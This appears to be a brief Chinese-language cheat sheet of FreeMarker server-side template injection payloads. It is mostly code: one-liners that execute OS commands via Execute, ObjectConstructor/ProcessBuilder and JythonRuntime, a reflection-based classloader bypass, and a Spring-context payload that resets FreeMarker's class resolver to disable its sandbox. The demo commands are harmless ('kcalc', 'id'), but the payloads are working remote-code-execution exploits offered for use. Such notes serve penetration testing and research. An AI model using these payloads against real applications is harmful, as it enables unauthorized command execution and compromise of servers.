---
title: "FreeMarker SSTI"
author: ["4shen0ne"]
tags: ["java"]
draft: false
---

最简单的 poc

```text
<#assign test="freemarker.template.utility.Execute"?new()> ${test("kcalc")}
```

poc1:

```text
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","kcalc").start()}
```

poc2:

```text
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("kcalc")
```

绕过 class.getClassloader 反射加载 Execute 类

```java
<#assign classloader=<<object>>.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

如果 Spring Beans 可用，可以直接禁用沙箱，这个 payload 需要应用使用
freemarker+spring 并设置 `setExposeSpringMacroHelpers(true)` 或者
application.propertices 中设置 `spring.freemarker.expose-spring-macro-helpers=true`

```java
<#assign ac=springMacroRequestContext.webApplicationContext>
<#assign fc=ac.getBean('freeMarkerConfiguration')>
<#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>
<#assign VOID=fc.setNewBuiltinClassResolver(dcr)>${"freemarker.template.utility.Execute"?new()("id")}
```
